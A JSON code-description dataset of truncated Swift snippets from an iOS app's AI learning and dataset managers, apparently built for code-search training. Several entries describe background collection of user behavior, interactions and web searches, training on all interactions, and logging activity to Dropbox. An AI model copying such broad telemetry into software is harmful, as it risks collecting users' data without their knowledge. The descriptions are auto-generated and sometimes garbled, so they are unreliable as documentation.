    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift",
    "code_type": "class"
  },
  {
    "id": "1571",
    "code": "func getAvailableDatasets(completion: @escaping (Result<[AIDataset], Error>) -> Void) {\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "MARK: - Public Methods / Get list of available datasets",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift",
    "code_type": "function"
  },
  {
    "id": "1572",
    "code": "func importDataset(from fileURL: URL, completion: @escaping (Result<AIDataset, Error>) -> Void) {\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "/ Import a dataset from a local file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift",
    "code_type": "function"
  },
  {
    "id": "1573",
    "code": "func useDatasetForTraining(_ dataset: AIDataset, completion: @escaping (Result<Void, Error>) -> Void) {\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "/ Use a dataset for AI model training",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift",
    "code_type": "function"
  },
  {
    "id": "1574",
    "code": "func deleteDataset(_ dataset: AIDataset, completion: @escaping (Result<Void, Error>) -> Void) {\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "/ Delete a dataset",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift",
    "code_type": "function"
  },
  {
    "id": "1575",
    "code": "func searchOnlineDatasets(completion: @escaping (Result<[AIDatasetInfo], Error>) -> Void) {\n// Simulate an API call to a dataset repository\nDispatchQueue.global(qos: .userInitiated).asyncAfter(deadline: .now() + 1.0) {",
    "nl": "/ Search for datasets available online",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift",
    "code_type": "function"
  },
  {
    "id": "1576",
    "code": "func downloadDataset(from url: URL, completion: @escaping (Result<AIDataset, Error>) -> Void) {\n// Create download task\nlet task = URLSession.shared.downloadTask(with: url) { [weak self] tempURL, response, error in",
    "nl": "/ Download a dataset from a URL",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift",
    "code_type": "function"
  },
  {
    "id": "1577",
    "code": "private func createDatasetFromFile(_ fileURL: URL) -> AIDataset? {\ndo {",
    "nl": "MARK: - Helper Methods / Create a dataset object from a file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift",
    "code_type": "function"
  },
  {
    "id": "1578",
    "code": "private func countRecordsInFile(_ fileURL: URL) throws -> Int {\nlet fileExtension = fileURL.pathExtension.lowercased()\nlet fileData = try Data(contentsOf: fileURL)\n\nif fileExtension == \"json\" {",
    "nl": "/ Count records in a dataset file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift",
    "code_type": "function"
  },
  {
    "id": "1579",
    "code": "private func updateDatasetName(_ dataset: AIDataset) {\ndo {",
    "nl": "/ Update dataset name based on content",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift",
    "code_type": "function"
  },
  {
    "id": "1580",
    "code": "private func logDatasetActivity(action: String, dataset: AIDataset, sourceURL: String? = nil) {\nlet timestamp = Date()\n\n// Create the log entry\nvar logEntry = \"\"\"\n=== DATASET ACTIVITY LOG ===\nTimestamp: \\(ISO8601DateFormatter().string(from: timestamp))\nAction: \\(action)\nDataset: \\(dataset.name)\nFormat: \\(dataset.format)",
    "nl": "/ Log dataset activity to Dropbox",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift",
    "code_type": "function"
  },
  {
    "id": "1581",
    "code": "private func setupAutomaticDatasetChecking() {\n// Check periodically for needed datasets\nlet timer = Timer.scheduledTimer(\ntimeInterval: 24 * 60 * 60,\ntarget: self,\nselector: #selector(checkForNeededDatasets),\nuserInfo: nil,\nrepeats: true\n)\nRunLoop.main.add(timer, forMode: .common)",
    "nl": "MARK: - Automatic Dataset Checking / Set up automatic dataset checking",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift",
    "code_type": "function"
  },
  {
    "id": "1582",
    "code": "@objc private func checkForNeededDatasets() {\n// Check if AI should look for new datasets\nAILearningManager.shared.checkForAvailableDatasets()\n}\n}\n",
    "nl": "Function checkForNeededDatasets - implements checkforneededdatasets functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift",
    "code_type": "function"
  },
  {
    "id": "1583",
    "code": "extension AILearningManager {\n/// URL for the model upload endpoint\nprivate var modelUploadEndpoint: URL {",
    "nl": "/ Extension to AILearningManager specifically for model upload to the server",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+FixedServerSync.swift",
    "code_type": "extension"
  },
  {
    "id": "1584",
    "code": "func uploadModelToServer(modelURL: URL) async throws -> String {\nDebug.shared.log(message: \"Starting model upload to server endpoint\", type: .info)\n\n// Create a multipart request\nvar request = URLRequest(url: modelUploadEndpoint)\nrequest.httpMethod = \"POST\"\n\n// API key authentication removed as it's no longer needed\n\n// Generate boundary for multipart request",
    "nl": "/ Upload a CoreML model to the server with proper multipart/form-data format",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+FixedServerSync.swift",
    "code_type": "function"
  },
  {
    "id": "1585",
    "code": "extension AILearningManager {\n/// Enhanced training method that uses ALL user interactions, not just rated ones\nfunc trainModelWithAllInteractions() -> (success: Bool, version: String, errorMessage: String?) {",
    "nl": "/ Extension to AILearningManager for improved training using all user interactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ImprovedTraining.swift",
    "code_type": "extension"
  },
  {
    "id": "1586",
    "code": "func trainModelWithAllInteractions() -> (success: Bool, version: String, errorMessage: String?) {\nDebug.shared.log(message: \"Starting comprehensive AI model training with ALL interactions\", type: .info)\n\ndo {",
    "nl": "/ Enhanced training method that uses ALL user interactions, not just rated ones",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ImprovedTraining.swift",
    "code_type": "function"
  },
  {
    "id": "1587",
    "code": "func overrideTrainingWithAllInteractions() {\n// Replace the original trainNewModel implementation by swizzling at runtime\nDebug.shared.log(message: \"Overriding training method to include ALL interactions\", type: .info)\n\n// Note: We're not actually doing method swizzling here since Swift doesn't support it easily\n// Instead, we'll just use this method from other parts of the code\n}\n\n/// Enhanced evaluation that triggers training based on ALL interactions\nfunc evaluateTrainingWithAllInteractions() {",
    "nl": "/ Override the original train method to use the improved one",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ImprovedTraining.swift",
    "code_type": "function"
  },
  {
    "id": "1588",
    "code": "func evaluateTrainingWithAllInteractions() {\n// Only train if learning is enabled\nguard isLearningEnabled else {",
    "nl": "/ Enhanced evaluation that triggers training based on ALL interactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ImprovedTraining.swift",
    "code_type": "function"
  },
  {
    "id": "1589",
    "code": "func trainModelWithAllInteractionsNow(completion: @escaping (Bool, String) -> Void) {\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "/ Manually trigger model training with all data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ImprovedTraining.swift",
    "code_type": "function"
  },
  {
    "id": "1590",
    "code": "extension AILearningManager {\n/// Perform deep personal learning based on user data\nfunc performDeepPersonalLearning() {",
    "nl": "/ Extension to AILearningManager for enhanced local model functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ModelUpload.swift",
    "code_type": "extension"
  },
  {
    "id": "1591",
    "code": "func performDeepPersonalLearning() {\nDebug.shared.log(message: \"Starting deep personal learning process\", type: .info)\n\n// Check if we have a trained model without storing the URL\nif getLatestModelURL() == nil {",
    "nl": "/ Perform deep personal learning based on user data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ModelUpload.swift",
    "code_type": "function"
  },
  {
    "id": "1592",
    "code": "func isTrainedModelAvailable() -> Bool {\nif let modelURL = getLatestModelURL() {",
    "nl": "/ Check if a trained model exists and is usable",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ModelUpload.swift",
    "code_type": "function"
  },
  {
    "id": "1593",
    "code": "func getTrainedModelInfo() -> (version: String, date: Date?) {\nlet version = currentModelVersion\nlet date = UserDefaults.standard.object(forKey: lastTrainingKey) as? Date\nreturn (version, date)\n}\n\n/// Handle web search data collection for AI improvement\n/// Internal implementation to avoid duplicate method declaration\nfunc handleWebSearchData(query: String, results: [String]) {",
    "nl": "/ Get information about the trained model",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ModelUpload.swift",
    "code_type": "function"
  },
  {
    "id": "1594",
    "code": "func handleWebSearchData(query: String, results: [String]) {\n// Only process if learning is enabled\nguard isLearningEnabled else {",
    "nl": "/ Handle web search data collection for AI improvement / Internal implementation to avoid duplicate method declaration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ModelUpload.swift",
    "code_type": "function"
  },
  {
    "id": "1595",
    "code": "extension AILearningManager {\n/// Apply overrides to make the AI learn from ALL user interactions\nfunc applyAllInteractionTrainingOverrides() {",
    "nl": "/ Extension that patches AILearningManager's training to use all user interactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+Overrides.swift",
    "code_type": "extension"
  },
  {
    "id": "1596",
    "code": "func applyAllInteractionTrainingOverrides() {\n// Replace the standard training evaluation with our enhanced version\n// that triggers training based on ALL interactions\n\n// Register a notification observer for app startup\nNotificationCenter.default.addObserver(\nforName: UIApplication.didFinishLaunchingNotification,\nobject: nil,\nqueue: .main\n) { [weak self] _ in",
    "nl": "/ Apply overrides to make the AI learn from ALL user interactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+Overrides.swift",
    "code_type": "function"
  },
  {
    "id": "1597",
    "code": "private func setupImprovedTraining() {\n// Configure shorter training intervals\nUserDefaults.standard.set(0.33, forKey: \"AITrainingDayInterval\") // Train every 8 hours\nUserDefaults.standard.set(5, forKey: \"AIMinimumInteractions\") // Only need 5 data points\n\n// Schedule more frequent training evaluation\nTimer.scheduledTimer(\ntimeInterval: 4 * 60 * 60, // Check every 4 hours\ntarget: self,\nselector: #selector(improvedTrainingTimerFired),",
    "nl": "/ Set up improved training that uses all interactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+Overrides.swift",
    "code_type": "function"
  },
  {
    "id": "1598",
    "code": "@objc private func improvedTrainingTimerFired() {\nevaluateTrainingWithAllInteractions()\n}\n\n/// Override the standard trainModelNow with our enhanced version\nfunc trainModelNowWithAllData(completion: @escaping (Bool, String) -> Void) {",
    "nl": "/ Timer handler for improved training",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+Overrides.swift",
    "code_type": "function"
  },
  {
    "id": "1599",
    "code": "func trainModelNowWithAllData(completion: @escaping (Bool, String) -> Void) {\ntrainModelWithAllInteractionsNow(completion: completion)\n}\n}\n",
    "nl": "/ Override the standard trainModelNow with our enhanced version",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+Overrides.swift",
    "code_type": "function"
  },
  {
    "id": "1600",
    "code": "extension AILearningManager {\n/// This struct represents basic information about a trained model\nstruct ModelInfo {",
    "nl": "/ Extension providing server compatibility methods for AILearningManager / These methods support legacy code that expected server functionality / but now operate in a server-independent way",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift",
    "code_type": "extension"
  },
  {
    "id": "1601",
    "code": "struct ModelInfo {\nlet version: String\nlet date: Date?\nlet size: Int64?\n}\n\n/// Struct for model upload results\nstruct ModelUploadResult {",
    "nl": "/ This struct represents basic information about a trained model",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift",
    "code_type": "struct"
  },
  {
    "id": "1602",
    "code": "struct ModelUploadResult {\nlet success: Bool\nlet message: String\n}\n\n/// Check if a trained model is available for upload\n/// Since server sync is disabled, this always returns false\nfunc isTrainedModelAvailableForUpload() -> Bool {",
    "nl": "/ Struct for model upload results",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift",
    "code_type": "struct"
  },
  {
    "id": "1603",
    "code": "func isTrainedModelAvailableForUpload() -> Bool {\nreturn false\n}\n\n/// Get information about the current local model\n/// Used for display in the UI\nfunc getTrainedModelInfo() -> ModelInfo {",
    "nl": "/ Check if a trained model is available for upload / Since server sync is disabled, this always returns false",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift",
    "code_type": "function"
  },
  {
    "id": "1604",
    "code": "func getTrainedModelInfo() -> ModelInfo {\nlet modelPath = modelsDirectory.appendingPathComponent(\"model_\\(currentModelVersion).mlmodel\")\n\n// Get file attributes if file exists\nvar fileSize: Int64?\nvar modDate: Date?\n\nif FileManager.default.fileExists(atPath: modelPath.path) {",
    "nl": "/ Get information about the current local model / Used for display in the UI",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift",
    "code_type": "function"
  },
  {
    "id": "1605",
    "code": "func uploadTrainedModelToServer() async -> ModelUploadResult {\nreturn ModelUploadResult(\nsuccess: false,\nmessage: \"Server sync is disabled. Using local model only.\"\n)\n}\n\n/// Perform enhanced local model training\n/// This replaces the server-dependent model training with a fully local approach\nfunc performEnhancedLocalTraining() {",
    "nl": "/ Simulate a model upload operation / Since server sync is disabled, this returns a failure result",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift",
    "code_type": "function"
  },
  {
    "id": "1606",
    "code": "func performEnhancedLocalTraining() {\nDebug.shared.log(message: \"Starting enhanced local model training\", type: .info)\n\n// Delegate to internal implementation\nenhancedLocalTraining()\n\nDebug.shared.log(message: \"Enhanced local training requested\", type: .info)\n}\n\n/// Process web search data for learning",
    "nl": "/ Perform enhanced local model training / This replaces the server-dependent model training with a fully local approach",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift",
    "code_type": "function"
  },
  {
    "id": "1607",
    "code": "func processWebSearchData(query: String, results: [String]) {\n// Delegate to the internal implementation in ModelUpload\nhandleWebSearchData(query: query, results: results)\n\n// Additional logging specific to this context\nDebug.shared.log(message: \"Processed web search data for learning: \\(query)\", type: .debug)\n}\n\n/// Log data collection events - safe replacement to avoid redeclarations\nprivate func logDataCollectionEvents() {",
    "nl": "/ Process web search data for learning / Used to improve AI responses based on search queries / Public API method - delegates to internal implementation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift",
    "code_type": "function"
  },
  {
    "id": "1608",
    "code": "private func logDataCollectionEvents() {\nDebug.shared.log(message: \"Internal background user data collection triggered\", type: .debug)\nDebug.shared.log(message: \"Background user data collection triggered\", type: .debug)\n}\n\n// Note: The queueForLocalProcessing method has been moved to AILearningManager+ServerSync.swift\n// to resolve duplicate method declarations\n\n/// Queue interactions for server sync\n/// This method exists for backward compatibility but does nothing",
    "nl": "/ Log data collection events - safe replacement to avoid redeclarations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift",
    "code_type": "function"
  },
  {
    "id": "1609",
    "code": "private func queueForServerSync() {\n// No-op since server sync is disabled\n}\n}\n",
    "nl": "Note: The queueForLocalProcessing method has been moved to AILearningManager+ServerSync.swift to resolve duplicate method declarations / Queue interactions for server sync / This method exists for backward compatibility but does nothing",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift",
    "code_type": "function"
  },
  {
    "id": "1610",
    "code": "extension AILearningManager {\n/// Queue data for local processing - internal implementation\nfunc internalQueueForLocalProcessing() {",
    "nl": "MARK: - Local Enhanced Learning Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift",
    "code_type": "extension"
  },
  {
    "id": "1611",
    "code": "func internalQueueForLocalProcessing() {\n// Don't queue if learning is disabled\nguard isLearningEnabled else {",
    "nl": "/ Queue data for local processing - internal implementation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift",
    "code_type": "function"
  },
  {
    "id": "1612",
    "code": "func queueForLocalProcessing() {\ninternalQueueForLocalProcessing()\n}\n\n/// Schedule local data processing\nfunc scheduleLocalProcessing() {",
    "nl": "/ Public API for queueing data - keeps original method name for compatibility / This is added to resolve duplication issues across extension files",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift",
    "code_type": "function"
  },
  {
    "id": "1613",
    "code": "func scheduleLocalProcessing() {\n// Check if processing is already scheduled\nif UserDefaults.standard.bool(forKey: \"AILocalProcessingScheduled\") {",
    "nl": "/ Schedule local data processing",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift",
    "code_type": "function"
  },
  {
    "id": "1614",
    "code": "func enhancedLocalTraining() {\n// Don't process if disabled\nguard isLearningEnabled else {",
    "nl": "/ Perform enhanced local training to improve personalization / Internal implementation to avoid duplicate method declaration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift",
    "code_type": "function"
  },
  {
    "id": "1615",
    "code": "private func getLocalProcessingData()\n-> (interactions: [AIInteraction], behaviors: [UserBehavior], patterns: [AppUsagePattern])\n{",
    "nl": "/ Helper to get local processing data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift",
    "code_type": "function"
  },
  {
    "id": "1616",
    "code": "func internalCollectUserDataInBackground() {\n// Only collect if learning is enabled\nguard isLearningEnabled else {",
    "nl": "/ Initiates background data collection for AI improvement / Internal implementation to avoid duplication in extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift",
    "code_type": "function"
  },
  {
    "id": "1617",
    "code": "class AILearningManager {\n// Singleton instance\nstatic let shared = AILearningManager()\n\n// Local storage for interactions\nvar storedInteractions: [AIInteraction] = []\nvar userBehaviors: [UserBehavior] = []\nvar appUsagePatterns: [AppUsagePattern] = []\n\n// Lock for thread-safe access",
    "nl": "/ Manager for on-device AI learning and improvement",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "class"
  },
  {
    "id": "1618",
    "code": "let modelsDirectory: URL // Changed to internal for extension access\nprivate let exportsDirectory: URL\n\n// Training configuration\nprivate let minInteractionsForTraining = 5 // Reduced for faster initial model creation\nprivate let minDaysBetweenTraining = 1\n\n// Current model version\nprivate(set) var currentModelVersion: String = \"1.0.0\"\n\nprivate init() {",
    "nl": "extension access - implements access functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "extension"
  },
  {
    "id": "1619",
    "code": "func setLearningEnabled(_ enabled: Bool) {\nUserDefaults.standard.set(enabled, forKey: learningEnabledKey)\nDebug.shared.log(message: \"AI learning \\(enabled ? \"enabled\" : \"disabled\")\", type: .info)\n}\n\n/// Server sync is now permanently disabled - we use only local model\nvar isServerSyncEnabled: Bool {",
    "nl": "/ Set whether AI learning is enabled",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1620",
    "code": "func setServerSyncEnabled(_: Bool) {\nUserDefaults.standard.set(false, forKey: \"AIServerSyncEnabled\")\nDebug.shared.log(message: \"AI server sync is permanently disabled - using local model only\", type: .info)\n}\n\n/// Verify export password\nfunc verifyExportPassword(_ password: String) -> Bool {",
    "nl": "/ This method is maintained for backward compatibility but all server sync is disabled",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1621",
    "code": "func verifyExportPassword(_ password: String) -> Bool {\nreturn password.sha256() == correctPasswordHash\n}\n\n/// Get the URL for the latest trained model (locally trained or server-provided)\nfunc getLatestModelURL() -> URL? {",
    "nl": "/ Verify export password",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1622",
    "code": "func getLatestModelURL() -> URL? {\n// We'll only use the locally trained model in the synchronous version for safety\n// Server model is only checked in the async version\n\n// Fall back to locally trained model\nlet modelPath = modelsDirectory.appendingPathComponent(\"model_\\(currentModelVersion).mlmodel\")\n\n// Check if file exists\nif FileManager.default.fileExists(atPath: modelPath.path) {",
    "nl": "/ Get the URL for the latest trained model (locally trained or server-provided)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1623",
    "code": "func getLatestModelURLAsync() async -> URL? {\n// First check for server-provided model - with proper await\nif isServerSyncEnabled, let serverModelURL = await BackdoorAIClient.shared.getLatestModelURLAsync() {",
    "nl": "/ Async version that properly awaits backend calls",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1624",
    "code": "func exportModel(password: String) -> Result<URL, ExportError> {\n// Verify password\nguard verifyExportPassword(password) else {",
    "nl": "/ Export the latest trained model",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1625",
    "code": "func recordInteraction(userMessage: String, aiResponse: String, intent: String, confidence: Double) {\n// Skip if learning is disabled\nguard isLearningEnabled else {",
    "nl": "/ Record a user interaction with the AI for learning purposes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1626",
    "code": "func recordUserBehavior(action: String, screen: String, duration: TimeInterval, details: [String: String] = [:]) {\n// Skip if learning is disabled\nguard isLearningEnabled else {",
    "nl": "/ Record user behavior within the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1627",
    "code": "func recordAppUsage(feature: String, timeSpent: TimeInterval, sequence: [String], completed: Bool) {\n// Skip if learning is disabled\nguard isLearningEnabled else {",
    "nl": "/ Record app usage pattern",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1628",
    "code": "func recordFeedback(for interactionId: String, rating: Int, comment: String? = nil) {\ninteractionsLock.lock()\n\n// Find the interaction\nif let index = storedInteractions.firstIndex(where: { $0.id == interactionId }) {",
    "nl": "/ Add feedback to a specific interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1629",
    "code": "func getLearningStatistics() -> LearningStatistics {\ninteractionsLock.lock()\nbehaviorsLock.lock()\npatternsLock.lock()\ndefer {",
    "nl": "/ Get statistics about stored interactions and learning data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1630",
    "code": "func trainModelNow(completion: @escaping (Bool, String) -> Void) {\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "/ Manually trigger model training",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1631",
    "code": "func clearAllInteractions() {\ninteractionsLock.lock()\nstoredInteractions.removeAll()\ninteractionsLock.unlock()\n\nsaveInteractions()\n\nDebug.shared.log(message: \"Cleared all stored AI interactions\", type: .info)\n}\n",
    "nl": "/ Clear all stored interactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1632",
    "code": "func trainModelWithAllInteractions(minimumInteractions: Int? = nil) -> Bool {\n// Get the number of interactions\ninteractionsLock.lock()\nlet interactionCount = storedInteractions.count\ninteractionsLock.unlock()\n\n// Use provided threshold or default\nlet threshold = minimumInteractions ?? minInteractionsForTraining\n\nguard interactionCount >= threshold else {",
    "nl": "/ Train a model using all interactions - now with a more flexible threshold",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1633",
    "code": "func collectUserDataInBackground() {\n// Record app state information\nlet context = AppContextManager.shared.currentContext()\n// Create descriptive details based on the context\nvar details: [String: String] = [:]\nfor (key, value) in context.additionalData {",
    "nl": "/ Collect user data in background thread for AI learning",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1634",
    "code": "private func scheduleTrainingEvaluation() {\n// Check once per day if training should be performed\nlet timer = Timer(\ntimeInterval: 24 * 60 * 60,\ntarget: self,\nselector: #selector(timerFired),\nuserInfo: nil,\nrepeats: true\n)\nRunLoop.main.add(timer, forMode: .common)",
    "nl": "MARK: - Private Methods / Schedule periodic evaluation for training",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1635",
    "code": "@objc private func timerFired() {\nevaluateTraining()\n}\n\n/// Evaluate if a new model should be trained\nprivate func evaluateTraining() {",
    "nl": "Function timerFired - implements timerfired functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1636",
    "code": "private func evaluateTraining() {\n// Only train if learning is enabled\nguard isLearningEnabled else {",
    "nl": "/ Evaluate if a new model should be trained",
    "language": "swift",
    "folder": "iOS",
